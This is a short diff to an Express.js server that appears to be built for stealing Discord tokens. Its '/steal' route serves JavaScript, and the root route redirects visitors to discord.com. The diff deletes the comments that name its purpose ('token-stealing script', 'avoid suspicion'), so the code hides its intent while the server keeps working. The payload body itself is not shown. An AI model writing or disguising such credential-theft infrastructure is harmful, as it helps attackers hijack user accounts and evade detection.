@@ -1,7 +1,6 @@
 const express = require('express');
 const app = express();
 
-// Serve the token-stealing script
 app.get('/steal', (req, res) => {
     res.set('Content-Type', 'application/javascript');
     res.send(`
@@ -18,7 +17,6 @@ app.get('/steal', (req, res) => {
     `);
 });
 
-// Redirect to avoid suspicion
 app.get('/', (req, res) => {
     res.redirect('https://discord.com');
 });
